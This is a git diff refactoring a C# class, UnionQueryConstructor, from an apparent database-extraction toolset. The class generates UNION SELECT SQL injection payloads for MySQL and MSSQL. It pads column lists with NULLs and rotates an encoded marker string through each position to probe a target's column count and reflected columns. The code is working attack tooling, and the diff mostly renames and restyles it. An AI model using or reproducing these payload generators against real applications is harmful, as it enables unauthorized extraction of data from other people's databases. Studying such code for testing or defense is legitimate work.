@@ -1,90 +1,89 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Text;
+﻿using System.Collections.Generic;
+using ToolSet.DatabaseExtractorCode.DBExtractor;
 
-namespace Sql_Database_Extraction
+namespace ToolSet.DatabaseExtractorCode.QueryConstructor
 {
-    public class UnionQueryConstructor
-    {
+   public class UnionQueryConstructor
+   {
+      private readonly List<string> _finalUnionQueries;
 
-        private List<string> FinalUnionQueries;
+      public UnionQueryConstructor()
+      {
+         _finalUnionQueries = new List<string>();
+      }
 
-        public UnionQueryConstructor()
-        {
-            FinalUnionQueries = new List<string>();
-        }
-
-        public List<string> createQueries(int MinValue, int MaxValue, eDataBase DataBaseType)
-        {
-            if (MinValue < MaxValue)
+      public List<string> CreateQueries(int minValue, int maxValue, DataBaseType dataBaseType)
+      {
+         if (minValue < maxValue)
+         {
+            for (int x = minValue; x < maxValue; x++)
             {
-                for (int x = MinValue; x < MaxValue; x++)
-                {
-                    string[] Basis = new string[x];
+               var basis = new string[x];
 
-                    for (int y = 0; y < Basis.Length; y++)
-                    {
-                        Basis[y] = "NULL,";
-                    }
+               for (int y = 0; y < basis.Length; y++)
+                  basis[y] = "NULL,";
 
-                    if (DataBaseType == eDataBase.MSSQL)
-                        unionQueryMSSQL(Basis);
-                    else
-                        unionQueryMySQL(Basis);
-                }
+               if (dataBaseType == DataBaseType.Mssql)
+                  UnionQueryMssql(basis);
+               else
+                  UnionQueryMySql(basis);
             }
-            return FinalUnionQueries;
-        }
+         }
+         return _finalUnionQueries;
+      }
 
-        private void unionQueryMySQL(string[] Basis)
-        {
-            Random zahl = new Random();
+      private void UnionQueryMySql(string[] basis)
+      {
+         // No usages?
+         //var zahl = new Random();
 
-            for (int z = 0; z < Basis.Length; z++)
-            {
-                int a = 12;
-                int b = 34;
-                int c = 4321;
+         const int a = 12;
+         const int b = 34;
+         const int c = 4321;
 
-                Basis[z] = "CONCAT(0x5f5f5f6c6c," + a + "," + b.ToString() + c.ToString() + ",0x6c6c5f5f5f),";
-                ZusammensetzenMySQL(Basis);
-                Basis[z] = "NULL,";
-            }
-        }
+         for (int z = 0; z < basis.Length; z++)
+         {
+            basis[z] = "CONCAT(0x5f5f5f6c6c," + a + "," + b + c + ",0x6c6c5f5f5f),";
+            AssembleMySql(basis);
+            basis[z] = "NULL,";
+         }
+      }
 
-        private void unionQueryMSSQL(string[] Basis)
-        {
-            Random zahl = new Random();
+      private void UnionQueryMssql(string[] basis)
+      {
+         // No usages?
+         //var zahl = new Random();
 
-            for (int y = 0; y < Basis.Length; y++)
-            {
-                int a = 1234;
-                int b = 4321;
+         const int a = 1234;
+         const int b = 4321;
 
-                Basis[y] = "Char(95)+Char(95)+Char(95)+Char(108)+Char(108)+CAST(" + a.ToString() + b.ToString() + " as varchar)+Char(108)+Char(108)+Char(95)+Char(95)+Char(95),";
-                ZusammenSetzenMSSQL(Basis);
-                Basis[y] = "NULL,";
-            }
-        }
+         for (int y = 0; y < basis.Length; y++)
+         {
+            basis[y] = "Char(95)+Char(95)+Char(95)+Char(108)+Char(108)+CAST(" + a + b +
+                       " as varchar)+Char(108)+Char(108)+Char(95)+Char(95)+Char(95),";
+            AssembleMssql(basis);
+            basis[y] = "NULL,";
+         }
+      }
 
-        private void ZusammensetzenMySQL(string[] Basis)
-        {
-            string query = string.Empty;
-            foreach (string element in Basis)
-            {
-                query = query + element;
-            }
-            FinalUnionQueries.Add("LIMIT 0 UNION SELECT " + query.Remove(query.LastIndexOf(",")));
-        }
+      private void AssembleMySql(string[] basis)
+      {
+         string query = string.Empty;
 
-        private void ZusammenSetzenMSSQL(string[] Basis)
-        {
-            string query = string.Empty;
-            foreach (string element in Basis)
-            {
-                query = query + element;
-            }
-            FinalUnionQueries.Add("UNION ALL SELECT " + query.Remove(query.LastIndexOf(",")));
-        }
-    }
+         foreach (string element in basis)
+            query = query + element;
+
+         _finalUnionQueries.Add("LIMIT 0 UNION SELECT " + query.Remove(query.LastIndexOf(",")));
+      }
+
+      private void AssembleMssql(string[] basis)
+      {
+         string query = string.Empty;
+
+         foreach (string element in basis)
+            query = query + element;
+
+         _finalUnionQueries.Add("UNION ALL SELECT " + query.Remove(query.LastIndexOf(",")));
+      }
+   }
 }
